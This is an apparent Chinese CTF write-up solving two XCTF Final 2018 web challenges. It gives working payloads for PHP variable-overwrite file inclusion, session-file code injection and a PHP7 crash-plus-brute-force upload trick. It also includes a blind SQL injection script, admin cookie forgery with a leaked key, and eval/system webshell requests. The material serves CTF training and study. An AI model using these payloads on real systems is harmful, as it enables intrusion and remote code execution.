@@ -1,0 +1,404 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="4d0816a2dc13f3f6a8661b13e0506bff">WEB1——Bestphp</h1>
+<p>这道题提供index.php源码<br/>
+index.php</p>
+<pre><code>&lt;?php
+    highlight_file(__FILE__);
+    error_reporting(0);
+    ini_set('open_basedir', '/var/www/html:/tmp');
+    $file = 'function.php';
+    $func = isset($_GET['function'])?$_GET['function']:'filters'; 
+    call_user_func($func,$_GET);
+    include($file);
+    session_start();
+    $_SESSION['name'] = $_POST['name'];
+    if($_SESSION['name']=='admin'){
+        header('location:admin.php');
+    }
+?&gt;</code></pre>
+<h2 data-content="1" id="c75378bdbd9870bfe42cdd5c4dd3f795">解题思路一</h2>
+<h3 data-content="1" id="c203ff4bda3689e111ba640582d8a423">变量覆盖，调用文件包含</h3>
+<p>从index.php可以看出<code>$_GET['function']</code>和<code>$_SESSION['name'] = $_POST['name']</code>可控</p>
+<p>其中<code>call_user_func($func,$_GET);</code>回调函数可利用<br/>
+而且<code>include($file);</code>调用了文件包含</p>
+<p>所以，可以调用变量覆盖函数，覆盖掉<code>$file</code>，从而引入文件包含<br/>
+payload:<br/>
+<code>http://10.99.99.16/?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=./function.php</code></p>
+<p>一开始只是<code>highlight_file</code>给出index.php的源码，利用文件包含读到了admin.php和function.php的源码，不过对解题没啥卵用。<br/>
+function.php</p>
+<pre><code>&lt;?php
+function filters($data){
+    foreach($data as $key=&gt;$value){
+        if(preg_match('/eval|assert|exec|passthru|glob|system|popen/i',$value)){
+            die('Do not hack me!');
+        }
+    }
+}
+?&gt;</code></pre>
+<p>admin.php</p>
+<pre><code>hello admin
+&lt;?php
+if(empty($_SESSION['name'])){
+    session_start();
+    #echo 'hello ' + $_SESSION['name'];
+}else{
+    die('you must login with admin');
+}
+
+?&gt;</code></pre>
+<p>吐槽点：早上题目的环境是php7.2，extract函数是无法动态调用的，然后中午主办方偷偷改了环境为7.0，也不发公告说一声，浪费了很多时间。</p>
+<h3 data-content="1" id="efbefb617286a8faeec3e7e4d53e77b5">调用session_start方法，修改session位置</h3>
+<p>从index.php可以看出<code>$_SESSION['name'] = $_POST['name']</code>，session的值可控，session默认的保存位置</p>
+<pre><code>/var/lib/php/sess_PHPSESSID
+/var/lib/php/sessions/sess_PHPSESSID
+
+/var/lib/php5/sess_PHPSESSID
+/var/lib/php5/sessions/sess_PHPSESSID
+
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID</code></pre>
+<p>由于<code>ini_set('open_basedir', '/var/www/html:/tmp')</code>，我们包含不了<code>/var/lib/</code>下的session</p>
+<p>但是我在tmp下也找不到自己的session，所以这里的session应该是在<code>/var/lib/</code>下</p>
+<p>这里可以调用session_start函数，修改session的位置<br/>
+本地的payload:</p>
+<pre><code>POST /xctf-bestphp/index.php?function=session_start&amp;save_path=. HTTP/1.1
+Host: 127.0.0.01
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 21
+Cookie: PHPSESSID=lfc5uk0rv8ndmjfv86u9tv6fk2
+Content-Type: application/x-www-form-urlencoded
+
+name=&lt;?php phpinfo();</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145058-7b5609a4-e259-1.png"/><br/>
+这里直接把session写到了web根目录，并且内容可控</p>
+<h3 data-content="1" id="cf013527766d60348841d1a61bdb8d49">文件包含session，getshell</h3>
+<p><code>http://10.99.99.16/index.php?function=extract&amp;file=./sess_lfc5uk0rv8ndmjfv86u9tv6fk2</code></p>
+<p>比赛的payload</p>
+<pre><code>POST /index.php?function=session_start&amp;save_path=/tmp HTTP/1.1
+Host: 10.99.99.16
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=a9tvfth9lfqabt9us85t3b07s1
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+
+name=&lt;?php echo "aaa";system($_GET[x]);?&gt;</code></pre>
+<pre><code>GET /index.php?function=extract&amp;file=/tmp/sess_a9tvfth9lfqabt9us85t3b07s1&amp;x=cat+sdjbhudfhuahdjkasndjkasnbdfdf.php HTTP/1.1
+Host: 10.99.99.16
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=a9tvfth9lfqabt9us85t3b07s1
+Upgrade-Insecure-Requests: 1</code></pre>
+<h2 data-content="1" id="4cf4e8090fd2e74355ada154c27af9d9">解题思路二</h2>
+<h3 data-content="1" id="ad12856dbea5da95a8e4f0b1684cff85">php7.0的bug</h3>
+<p>王一航师傅发过一篇文章：<a href="https://www.jianshu.com/p/dfd049924258" target="_blank">https://www.jianshu.com/p/dfd049924258</a><br/>
+是php7的一个小bug</p>
+<pre><code>include.php?file=php://filter/string.strip_tags/resource=/etc/passwd</code></pre>
+<p><code>string.strip_tags</code>可以导致php7在执行过程中奔溃</p>
+<p>如果请求中同时存在一个文件上传的请求 , 这个文件就会被因为奔溃被保存在<code>/tmp/phpXXXXXX</code>(XXXXXX是数字+字母的6位数)</p>
+<p>这个文件是持续保存的，不用竞争，直接爆破，为了爆破成功可以多线程去上传文件，生成多个phpXXXXXX</p>
+<h3 data-content="1" id="413632e89605fde506bac86d5a8edafb">burp多线程上传文件</h3>
+<pre><code>POST /index.php?function=extract&amp;file=php://filter/string.strip_tags/resource=function.php HTTP/1.1
+Host: 10.99.99.16
+Content-Length: 1701
+Cache-Control: max-age=0
+Origin: null
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
+Cookie: PHPSESSID=17qpuv1r8g19pm503593nddq10
+Connection: close
+
+------WebKitFormBoundaryeScXqSzdW2v22xyk
+Content-Disposition: form-data; name="fileUpload"; filename="test.jpg"
+Content-Type: image/jpeg
+
+&lt;?php echo "wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww";@eval($_POST['cmd']);  ?&gt;
+------WebKitFormBoundaryeScXqSzdW2v22xyk--</code></pre>
+<h3 data-content="1" id="2e64023873d14d194b553847adaed1e7">爆破脚本</h3>
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import requests
+import string
+
+charset = string.digits + string.letters
+
+host = "10.99.99.16"
+port = 80
+base_url = "http://%s:%d" % (host, port)
+
+
+def brute_force_tmp_files():
+    for i in charset:
+        for j in charset:
+            for k in charset:
+                for l in charset:
+                    for m in charset:
+                        for n in charset:
+                            filename = i + j + k + l + m + n
+                            url = "%s/index.php?function=extract&amp;file=/tmp/php%s" % (
+                                base_url, filename)
+                            print url
+                            try:
+                                response = requests.get(url)
+                                if 'wwwwwwwwwwwwww' in response.content:
+                                    print "[+] Include success!"
+                                    return True
+                            except Exception as e:
+                                print e
+    return False
+
+
+def main():
+    brute_force_tmp_files()
+
+
+if __name__ == "__main__":
+    main()</code></pre>
+<h3 data-content="1" id="a4f9f2ac326faea905a2f38f5c6d1ce0">getshell</h3>
+<p>爆破成功后，得到成功文件包含的shell</p>
+<pre><code>http://10.99.99.16/index.php?function=extract&amp;file=/tmp/phpXXXXX</code></pre>
+<h1 data-content="1" id="a53cd9773d14637ebdb53ff05d440d10">WEB2——PUBG</h1>
+<p>赛题提供了源码<br/>
+<a href="https://github.com/aye-whitehat/CTF-Collection/blob/master/XCTF%20Final%202018/web/PUBG/www.zip" target="_blank">https://github.com/aye-whitehat/CTF-Collection/blob/master/XCTF%20Final%202018/web/PUBG/www.zip</a></p>
+<p>但是zend加密了，给出解密后的代码，但是变量名还是混淆的<br/>
+<a href="https://github.com/aye-whitehat/CTF-Collection/blob/master/XCTF%20Final%202018/web/PUBG/DECODE.zip" target="_blank">https://github.com/aye-whitehat/CTF-Collection/blob/master/XCTF%20Final%202018/web/PUBG/DECODE.zip</a></p>
+<p>环境还没关，复现记得修改下host <code>159.138.22.212 guaika.txmeili.com</code></p>
+<p>这题在比赛的时候利用的漏洞链是：sql注入+cookie伪造+后台getshell</p>
+<h2 data-content="1" id="efcefe715b15a5a5783182850a1c9692">解题思路</h2>
+<h3 data-content="1" id="c6d879854d7673e6aa664ac7aadc5845">sql注入</h3>
+<p>代码位于 kss_inc/payapi_return2.php<br/>
+关键代码：<br/>
+这里的post参数没有调用该框架的sql过滤器，只是进行简单的trim()处理</p>
+<pre><code>else if ( $_obfuscate_kYyPkY_PkJKVh4qGjJGIio4� == "e138" )
+{
+    $_obfuscate_kpGPh4mNh46SkZONh4eLlJU� = "";
+    $_obfuscate_k42NkY2RkoiNjJCKlZSKiIg� = trim( $_POST['SerialNo'] );
+    $_obfuscate_iJWMjIiVi5OGjJOViY2Li48� = $_obfuscate_k42NkY2RkoiNjJCKlZSKiIg�;
+    $_obfuscate_iIuQkYaUioqGlI6IjIuMiI8� = trim( $_POST['Status'] );
+    $_obfuscate_jpGJk5SSkJOIk4iQiI_OhpU� = trim( $_POST['Money'] );
+    $_obfuscate_lIuQk5OGjpKVjY6UiI_QjJM� = $_obfuscate_jpGJk5SSkJOIk4iQiI_OhpU�;
+    $_obfuscate_iImJjYmQjYyOjIuVkIuMjIs� = trim( $_POST['VerifyString'] );</code></pre>
+<p>VerifyString的计算规则</p>
+<pre><code>else if ( $_obfuscate_kYyPkY_PkJKVh4qGjJGIio4� == "e138" )
+{
+    $_obfuscate_k4mJh5SPkY6Vh4qHjIaJh44� = TRUE;
+    if ( $_obfuscate_iImJjYmQjYyOjIuVkIuMjIs� != strtolower( md5( "SerialNo=".$_obfuscate_k42NkY2RkoiNjJCKlZSKiIg�."&amp;UserID=".$_obfuscate_jI2JlY_QkoeQj5OLjouLlYo�['e138set']."&amp;Money=".$_obfuscate_jpGJk5SSkJOIk4iQiI_OhpU�."&amp;Status=".$_obfuscate_iIuQkYaUioqGlI6IjIuMiI8�."&amp;AttachString=e138&amp;MerchantKey=".$_obfuscate_jI2JlY_QkoeQj5OLjouLlYo�['e138key'] ) ) )
+    {
+        $_obfuscate_k4mJh5SPkY6Vh4qHjIaJh44� = FALSE;
+    }</code></pre>
+<p>因为设置了AttachString=e138<br/>
+所以<code>$_obfuscate_jI2JlY_QkoeQj5OLjouLlYo�['e138set']</code>值为1<br/>
+所以VerifyString的值为<code>strtolower(md5('SerialNo=1&amp;UserID=1&amp;Money=100&amp;Status=1&amp;AttachString=e138&amp;MerchantKey=1'))</code><br/>
+即为ebd95c4233e8c02fe0854306afd71bee</p>
+<p>但其实我们只要把参数都找到就ok了，因为不会先验证VerifyString，而是先验证SerialNo和Money参数</p>
+<p>造成sql注入的代码如下：</p>
+<pre><code>$_obfuscate_lZGQj4iOj4mTlZGNjZGUj5E� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�-&gt;_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_order where ordernum='".$_obfuscate_iJWMjIiVi5OGjJOViY2Li48�."'" );</code></pre>
+<p>payload:<br/>
+<a href="http://guaika.txmeili.com:8888/kss_inc/payapi_return2.php" target="_blank">http://guaika.txmeili.com:8888/kss_inc/payapi_return2.php</a><br/>
+注入点在SerialNo</p>
+<pre><code>SerialNo=0'or(0)#&amp;UserID=1&amp;Money=100&amp;Status=1&amp;AttachString=e138&amp;MerchantKey=1&amp;VerifyString=ebd95c4233e8c02fe0854306afd71bee</code></pre>
+<pre><code>SerialNo=1'or(1)#&amp;UserID=1&amp;Money=100&amp;Status=1&amp;AttachString=e138&amp;MerchantKey=1&amp;VerifyString=ebd95c4233e8c02fe0854306afd71bee</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145059-7c15b4a2-e259-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145059-7c44d20a-e259-1.png"/></p>
+<p>尝试注入得到admin的密码<br/>
+kss_inc/db_function.php 中可以看到登陆逻辑</p>
+<pre><code>if ( empty( $_obfuscate_lIqUlIaMj4aNjJCRkoeJlJE� ) )
+    {
+        $_obfuscate_h5SQiYyTkY_PjYmRjZWPh4k� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�-&gt;_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where id=1" );
+        if ( $_obfuscate_lIqUlIaMj4aNjJCRkoeJlJE� != md5( $_obfuscate_h5SQiYyTkY_PjYmRjZWPh4k�['username'].$_obfuscate_h5SQiYyTkY_PjYmRjZWPh4k�['password'] ) )
+        {
+            _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "你的原始身份效验失败！" );
+        }
+        $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['level'] = 9;
+        $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['powerlist'] = "admin";
+    }</code></pre>
+<p>表名是 kss_tb_manager，字段是username和password，id是1</p>
+<p>注入脚本 aye.py</p>
+<pre><code>#! coding:utf-8
+
+import requests
+import sys
+if sys.getdefaultencoding() != 'utf-8':
+    reload(sys)
+    sys.setdefaultencoding('utf-8')
+
+def main():
+    url="http://guaika.txmeili.com:8888/kss_inc/payapi_return2.php"
+    chars = 'abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ=+-*/{\}?!:@#$%&amp;()[],. '
+    result=''
+
+    for i in range(1,1000):
+        i =str(i)
+        for j in chars:
+            j=ord(j)
+            #SerialNo=0'or(1)#&amp;UserID=1&amp;Money=100&amp;Status=1&amp;AttachString=e138&amp;MerchantKey=1&amp;VerifyString=ebd95c4233e8c02fe0854306afd71bee
+            payload = """0'or(ascii(substr((select(concat(username,0x3a,password))from(kss_tb_manager)where(id=1)),%s,1))=%s)#"""%(i,j)
+            data = {'SerialNo': payload,
+                    'UserID' : 1,
+                    'Money' : 100,
+                    'Status' : 1,
+                    'AttachString' : 'e138',
+                    'MerchantKey' : 1,
+                    'VerifyString' : 'ebd95c4233e8c02fe0854306afd71bee',
+                    }
+            #print payload
+            do_whlie = True
+            while  do_whlie:
+                try:
+                    r=requests.post(url,data=data) 
+                    if r.status_code == 200:
+                        do_whlie = False
+                except Exception as e:
+                    print str(e)
+            #print r.text
+            if '订单金额不符' in r.text:
+                result += chr(j)
+                #print r.text
+                print result   
+
+if __name__ == "__main__":
+    main()</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145100-7c7f3fb2-e259-1.png"/><br/>
+得到账号密码：<br/>
+<code>axing:8ccf03839a8c63a3a9de17fa5ac6a192</code><br/>
+密码在somd5解密得到<code>axing147258</code><br/>
+但是登陆不了。。。。赛后跟出题人交流才知道，他把管理员的密码和安全码最后一个字节改了，坑爹的是cmd5和somd5只是取了md5中间的16位进行相似匹配，允许误差<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145100-7c97a688-e259-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145100-7ca87a4e-e259-1.png"/><br/>
+所以数据库92结尾的md5是反解不了的</p>
+<p>这里也可以用sqlmap直接跑，就是要加上一些参数，不然跑不出来<br/>
+<code>sqlmap -r burp.txt -p SerialNo --dbms mysql --risk 3 --level 5 --string="订单金额不符"  --technique B</code></p>
+<pre><code>POST /kss_inc/payapi_return2.php HTTP/1.1
+Host: guaika.txmeili.com:8888
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 123
+
+SerialNo=0&amp;UserID=1&amp;Money=100&amp;Status=1&amp;AttachString=e138&amp;MerchantKey=1&amp;VerifyString=ebd95c4233e8c02fe0854306afd71bee</code></pre>
+<h3 data-content="1" id="c9eac61542d0b8e9553f93738dc3c9e0">cookie伪造</h3>
+<p>代码位于kss_inc/function.php<br/>
+有setcookie_function（包含禁ip的逻辑）</p>
+<pre><code>function _obfuscate_jZKVlY6HkYmKkIyRj4qSjIc�( $_obfuscate_iYyTho_HlJCOh4yRj4ePj4k�, $_obfuscate_ipCJlJOSlJSQkYqNlYqKlIs� )
+{
+    setcookie( $_obfuscate_iYyTho_HlJCOh4yRj4ePj4k�, $_obfuscate_ipCJlJOSlJSQkYqNlYqKlIs�, 0, "/", NULL, NULL, TRUE );
+    if ( BINDIP == 1 )
+    {
+        setcookie( $_obfuscate_iYyTho_HlJCOh4yRj4ePj4k�."_ver", md5( $_obfuscate_ipCJlJOSlJSQkYqNlYqKlIs�.COOKKEY._obfuscate_jZKKjpCGkZSUj4aOiIePlZI�( ) ), 0, "/", NULL, NULL, TRUE );
+    }
+    else
+    {
+        setcookie( $_obfuscate_iYyTho_HlJCOh4yRj4ePj4k�."_ver", md5( $_obfuscate_ipCJlJOSlJSQkYqNlYqKlIs�.COOKKEY ), 0, "/", NULL, NULL, TRUE );
+    }
+    return $_obfuscate_ipCJlJOSlJSQkYqNlYqKlIs�.COOKKEY;
+}</code></pre>
+<p>位于kss_admin/index.php<br/>
+调用了setcookie_function<br/>
+<code>_obfuscate_jZKVlY6HkYmKkIyRj4qSjIc�( "kss_manager", $_obfuscate_i4qGi5WLhoqPkoyGkoiMhpU� );</code></p>
+<pre><code>$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�-&gt;_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_manager set `linecode`='".$_obfuscate_kI6PjYmLhpGMk4qGjZSHlIg�."',`lastlogintime`='"._obfuscate_jZGJkpOSkY_HiY2HjY2JlIg�( )."',`lastloginip`=".$_obfuscate_kYmJjZOIiZKJioqMkoaGiYk�." where `id`=".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id'], "notsync" );
+$_obfuscate_i4mRjZCJlZCGk4_UioyHk4k�['logintype'] = 1;
+_obfuscate_jYuKk4uOiYmSkpOTj5GUlZA�( $_obfuscate_i4mRjZCJlZCGk4_UioyHk4k� );
+$_obfuscate_i4qGi5WLhoqPkoyGkoiMhpU� = $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id'].",".$_obfuscate_h4eSk4uGiZCKhoyNkIiTlI8�.",".md5( $_obfuscate_jZOIiIiJkJOGiY_KjoaGh4c� ).",".$_obfuscate_kI6PjYmLhpGMk4qGjZSHlIg�;
+_obfuscate_jZKVlY6HkYmKkIyRj4qSjIc�( "kss_manager", $_obfuscate_i4qGi5WLhoqPkoyGkoiMhpU� );</code></pre>
+<p>其实就是调用了<br/>
+<code>setcookie_function( "kss_manager",$id.",".$username.",".md5($password).",".$linecode"</code></p>
+<p>然后执行两句setcookie，得到kss_manager和kss_manager_ver两个cookie</p>
+<pre><code>setcookie( $_obfuscate_iYyTho_HlJCOh4yRj4ePj4k�, $_obfuscate_ipCJlJOSlJSQkYqNlYqKlIs�, 0, "/", NULL, NULL, TRUE );
+
+setcookie( $_obfuscate_iYyTho_HlJCOh4yRj4ePj4k�."_ver", md5( $_obfuscate_ipCJlJOSlJSQkYqNlYqKlIs�.COOKKEY ), 0, "/", NULL, NULL, TRUE )</code></pre>
+<p>并且在 kss_inc/_config.php找到$COOKKEY的值 XIpCcfoe_y43</p>
+<pre><code>define( "COOKKEY", "XIpCcfoe_y43" );
+define( "COOKKEY2", "MGHOu2m|oXDz" );</code></pre>
+<p>也在 kss_inc/db_function.php<br/>
+找到了$linecode的值 efefefef</p>
+<pre><code>if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['linecode'] != $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQ�[3] &amp;&amp; "efefefef" != $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQ�[3] &amp;&amp; $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['username'] != "test01" )
+    {
+        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "您的帐号被挤下线，&lt;a href=index.php target=_top&gt;请重新登陆&lt;/a&gt;" );
+    }</code></pre>
+<p>所以最终的两个cookie的键值分别是</p>
+<pre><code>kss_manager
+1,axing,8ccf03839a8c63a3a9de17fa5ac6a192,efefefef
+
+kss_manager_ver
+md5("1,axing,8ccf03839a8c63a3a9de17fa5ac6a192,efefefef"."XIpCcfoe_y43")
+即为
+md5("1,axing,8ccf03839a8c63a3a9de17fa5ac6a192,efefefefXIpCcfoe_y43")
+即为
+b05a94ffcb3da369a828235012990953</code></pre>
+<p>成功伪造cookie，访问 kss_admin/admin.php<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145100-7cc904ee-e259-1.png"/><br/>
+浏览器替换cookie<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145101-7cecc122-e259-1.png"/></p>
+<h3 data-content="1" id="7db95db8a5f666e0646224337add49e5">后台getshell</h3>
+<p>代码位于 kss_admin/admin_update</p>
+<p>这个网站的更新，是从远端主站拉取代码写入本地:</p>
+<pre><code>$_obfuscate_koiKkIiPjI6UkYeRlIqNhoc� = _obfuscate_lY6Gk5KMkYmPjIyPhpCOlYc�( "http://api.hphu.com/import/".$_obfuscate_koaSiYqGjIqMiZSLk4uGiZU�.".php?phpver=".PHP_VERSION."&amp;webid=".WEBID."&amp;rid=".time( ), 300 );</code></pre>
+<p>我们跟入<code>_obfuscate_lY6Gk5KMkYmPjIyPhpCOlYc�</code>函数<br/>
+位于第20行，函数中有curl相关的操作</p>
+<pre><code>curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_HEADERFUNCTION, "read_header" );
+curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_WRITEFUNCTION, "read_body" );</code></pre>
+<p>看下read_body函数</p>
+<pre><code>function read_body( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, $_obfuscate_jJWMiJWJjoyIkYmLjY6VipM� )
+{
+    global $_obfuscate_ko6MhoiQkJKRlYeVio_JjYo�;
+    global $_obfuscate_j4eNjZOQlIuKhoqMj4mOjYs�;
+    global $_obfuscate_koaSiYqGjIqMiZSLk4uGiZU�;
+    if ( $_obfuscate_ko6MhoiQkJKRlYeVio_JjYo� == 0 &amp;&amp; substr( $_obfuscate_jJWMiJWJjoyIkYmLjY6VipM�, 0, 2 ) == "&lt;!" )
+    {
+        $_obfuscate_j4eNjZOQlIuKhoqMj4mOjYs� = 0;
+    }
+    $_obfuscate_ko6MhoiQkJKRlYeVio_JjYo� += strlen( $_obfuscate_jJWMiJWJjoyIkYmLjY6VipM� );
+    file_put_contents( KSSROOTDIR."kss_tool".DIRECTORY_SEPARATOR."_webup.php", $_obfuscate_jJWMiJWJjoyIkYmLjY6VipM�, FILE_APPEND );
+    echo "&lt;script&gt;$('#downsize').html('".$_obfuscate_ko6MhoiQkJKRlYeVio_JjYo�."');&lt;/script&gt;";
+    echo "&lt;!--  ".str_repeat( " ", 2000 )." --&gt;\r\n";
+    ob_flush( );
+    flush( );
+    return strlen( $_obfuscate_jJWMiJWJjoyIkYmLjY6VipM� );
+}</code></pre>
+<p>其中read_body函数会将curl到的内容写到 kss_tool/_webup.php</p>
+<pre><code>file_put_contents( KSSROOTDIR."kss_tool".DIRECTORY_SEPARATOR."_webup.php", $_obfuscate_jJWMiJWJjoyIkYmLjY6VipM�, FILE_APPEND );</code></pre>
+<p>这里我们可以利用代码中的sql过滤器，去触发某个页面的sql报错，从而将php代码回显，从而将恶意代码写入kss_tool/_webup.php，构造webshell</p>
+<p>例子：</p>
+<h4 data-content="1" id="12fd40827266d819599bb9c2fe37837b">构造sql报错并回显</h4>
+<pre><code>http://api.hphu.com/test/kss_admin/index.php?action=aye666%27</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145101-7cfc69a6-e259-1.png"/></p>
+<h4 data-content="1" id="eaa9f42c0a35bdecf066120aeb7d3c8e">构造更新路径</h4>
+<p>将报错的页面内容写入 kss_tool/_webup.php</p>
+<pre><code>http://guaika.txmeili.com:8888/kss_admin/admin_update.php?pakname=../test/kss_admin/index.php?action=aye666%27</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145101-7d0de5dc-e259-1.png"/></p>
+<h4 data-content="1" id="148c6e1cdf99e095084c025b3d0a6e95">触发phpinfo</h4>
+<pre><code>http://guaika.txmeili.com:8888/kss_admin/admin_update.php?pakname=../test/kss_admin/index.php?action='&lt;?php%2520phpinfo();?&gt;</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145101-7d3184ba-e259-1.png"/></p>
+<h4 data-content="1" id="b00abfa2d2f4d572e33c53a99c413f1d">写shell</h4>
+<pre><code>http://guaika.txmeili.com:8888/kss_admin/admin_update.php?pakname=../test/kss_admin/index.php?action='&lt;?php%2520eval($_POST[aye]);echo%2520"aye666"?&gt;</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145101-7d4a69c6-e259-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145101-7d5da7e8-e259-1.png"/><br/>
+连接菜刀：<a href="http://guaika.txmeili.com:8888/kss_tool/_webup.php" target="_blank">http://guaika.txmeili.com:8888/kss_tool/_webup.php</a></p>
